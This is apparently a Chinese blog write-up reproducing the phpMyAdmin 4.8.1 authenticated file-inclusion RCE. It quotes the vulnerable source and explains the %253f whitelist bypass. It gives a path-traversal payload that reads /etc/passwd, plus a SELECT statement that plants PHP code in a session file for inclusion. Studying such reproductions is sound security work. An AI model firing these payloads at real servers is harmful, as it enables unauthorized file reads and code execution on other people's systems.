categories:
- cve复现
tags:
- cve复现
title: phpmyadmin 4.8.1 rce
---
# phpmyadmin 4.8.1 rce



## 利用条件

 phpMyAdmin 4.8.0 and 4.8.1 

登陆账号

## 漏洞复现

环境:phpstudy 2018,windows 10

漏洞位置:`index.php`:57

```php
if (! empty($_REQUEST['target'])
    && is_string($_REQUEST['target'])
    && ! preg_match('/^index/', $_REQUEST['target'])
    && ! in_array($_REQUEST['target'], $target_blacklist)
    && Core::checkPageValidity($_REQUEST['target'])
) {
    include $_REQUEST['target'];
    exit;
}
```

非常明显的任意文件包含漏洞

前面几个条件都很好满足,我们看下最后一个`Core::checkPageValidity($_REQUEST['target'])`

跟进去

```php
public static function checkPageValidity(&$page, array $whitelist = [])
    {
        if (empty($whitelist)) {
            $whitelist = self::$goto_whitelist;
        }
        if (! isset($page) || !is_string($page)) {
            return false;
        }

        if (in_array($page, $whitelist)) {
            return true;
        }

        $_page = mb_substr(
            $page,
            0,
            mb_strpos($page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        $_page = urldecode($page);
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        return false;
    }
```

要返回`true`的话,需要`$page`从开头到第一个`?`之间的字符串在白名单中,有以下白名单

```php
array (
  0 => 'db_datadict.php',
....
)
```

因为复现环境是在windows下,windows文件名不能包含`?`,所以`db_datadict.php?`会变为`db_datadict.php`是一个已经存在的文件,我们便无法用`../`来穿梭目录了,但是我们可以看到` $_page = urldecode($page);`

所以我们可以构造`db_datadict.php%253f`来绕过

通用的payload:

`db_datadict.php%253f../../../../../../../../../../../etc/passwd`

可以通过` SELECT '<?=phpinfo()?>'; ` 来写shell到我们的session中

![image1794](https://i.loli.net/2020/02/08/p4l2vM6JOLsTGCd.png)

![image1859](https://i.loli.net/2020/02/08/wUZHdhJx9KSQRG7.png)

## 总结

`db_datadict.php%253f../../../../../../../../../../../etc/passwd`

可以通过` SELECT '<?=phpinfo()?>'; ` 来写shell到我们的session中